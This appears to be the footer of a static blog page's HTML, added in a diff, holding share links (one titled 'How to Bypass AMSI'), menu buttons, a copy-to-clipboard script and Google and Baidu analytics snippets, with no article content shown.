+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0range-x.github.io/2022/01/23/AMSI/&t=How to Bypass AMSI"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    0r@nge
+  </div>
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</footer>
+
+    </div>
+
+    
+
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-86660611-1');
+    </script>
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
